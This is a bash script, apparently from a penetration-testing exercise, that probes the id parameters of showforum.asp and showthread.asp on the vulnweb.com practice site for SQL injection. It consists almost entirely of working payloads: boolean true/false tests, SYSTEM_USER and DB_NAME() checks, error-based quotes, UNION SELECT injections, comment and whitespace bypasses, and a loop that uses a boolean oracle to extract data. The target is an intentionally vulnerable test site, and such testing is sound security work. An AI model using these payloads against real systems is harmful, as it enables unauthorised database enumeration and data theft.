#!/usr/bin/env bash
# Round 7 Part B3 — id SQLi 검증 (GET, 읽기 전용). 공백은 --data-urlencode 로 정상 인코딩.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; JAR="$OUT/b_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30 -b "$JAR")
OUR=$(cat "$OUT/b_our_thread_id.txt" 2>/dev/null || echo 9)
pc() { grep -o "class='posttext'" "$1" 2>/dev/null | wc -l; }
tl() { grep -o 'showthread\.asp?id=[0-9]*' "$1" 2>/dev/null | wc -l; }

sf() { local label="$1" name="$2" val="$3" code size
  read -r code size < <("${CURL[@]}" -G --data-urlencode "id=$val" -o "$OUT/d_sf_$name.html" \
      -w "%{http_code} %{size_download}" "$BASE/showforum.asp")
  printf "  %-62s %s %-6s threadlinks=%s\n" "$label" "$code" "$size" "$(tl "$OUT/d_sf_$name.html")"; }
st() { local label="$1" name="$2" val="$3" code size
  read -r code size < <("${CURL[@]}" -G --data-urlencode "id=$val" -o "$OUT/d_st_$name.html" \
      -w "%{http_code} %{size_download}" "$BASE/showthread.asp")
  printf "  %-62s %s %-6s posts=%s\n" "$label" "$code" "$size" "$(pc "$OUT/d_st_$name.html")"; }

echo "### D1. /showforum.asp?id=  (GET, 읽기 전용)"
sf "baseline id=0"                                          base     "0"
sf "id=1 (다른 포럼)"                                        other    "1"
sf "id=0 AND 1=1  (TRUE)"                                   t1       "0 AND 1=1"
sf "id=0 AND 1=2  (FALSE)"                                  f1       "0 AND 1=2"
sf "id=0 AND (SELECT SYSTEM_USER)='acunetix'  (TRUE)"       t2       "0 AND (SELECT SYSTEM_USER)='acunetix'"
sf "id=0 AND (SELECT SYSTEM_USER)='sa'        (FALSE)"      f2       "0 AND (SELECT SYSTEM_USER)='sa'"
sf "id=0 AND (SELECT DB_NAME())='acuforum'    (TRUE)"       t3       "0 AND (SELECT DB_NAME())='acuforum'"
sf "id=0 AND (SELECT DB_NAME())='master'      (FALSE)"      f3       "0 AND (SELECT DB_NAME())='master'"
sf "오류기반  id=0'"                                          err      "0'"
sf "오류기반  id=0\""                                         err2     "0\""
sf "UNION 2컬럼  id=0 UNION SELECT 'INJ',descr FROM forums WHERE id=1" unin "0 UNION SELECT 'INJ',descr FROM forums WHERE id=1"
sf "주석형  id=0--"                                           cmt      "0--"
sf "공백대체  id=0/**/AND/**/1=1"                             cmt2     "0/**/AND/**/1=1"

echo
echo "### D2. /showthread.asp?id=  (GET, 읽기 전용, 대상 = 우리 스레드 $OUR)"
st "baseline id=$OUR (우리 스레드, 게시글 2건)"                    base   "$OUR"
st "id=$OUR AND 1=1  (TRUE)"                                  t1     "$OUR AND 1=1"
st "id=$OUR AND 1=2  (FALSE)"                                 f1     "$OUR AND 1=2"
st "id=$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=2 (TRUE)"  t2 "$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=2"
st "id=$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=99 (FALSE)" f2 "$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=99"
st "id=$OUR AND (SELECT SYSTEM_USER)='acunetix' (TRUE)"       t3     "$OUR AND (SELECT SYSTEM_USER)='acunetix'"
st "id=$OUR AND (SELECT SYSTEM_USER)='sa' (FALSE)"            f3     "$OUR AND (SELECT SYSTEM_USER)='sa'"
st "오류기반  id=$OUR'"                                         err    "$OUR'"
st "id=$OUR OR 1=1 (전 스레드 노출 시도)"                        orall  "$OUR OR 1=1"
st "UNION 4컬럼  id=$OUR UNION SELECT 'INJ',0,$OUR,'INJ'"       uniona "$OUR UNION SELECT 'INJ',0,$OUR,'INJ'"
st "공백대체  id=$OUR/**/AND/**/1=1"                            cmt2   "$OUR/**/AND/**/1=1"
st "공백대체  id=$OUR/**/AND/**/1=2"                            cmt3   "$OUR/**/AND/**/1=2"

echo
echo "### D3. 추출 시연 — 우리 스레드 조건에서 서브쿼리 오라클로 카운트 추출"
for n in 0 1 2 3 5 10; do
  printf "  (SELECT COUNT(*) FROM posts WHERE threadid=$OUR) > %-3s → " "$n"
  "${CURL[@]}" -G --data-urlencode "id=$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)>$n" \
     "$BASE/showthread.asp" | grep -o "class='posttext'" | wc -l | sed 's/^2$/TRUE(게시글 렌더)/; s/^0$/FALSE/'
done
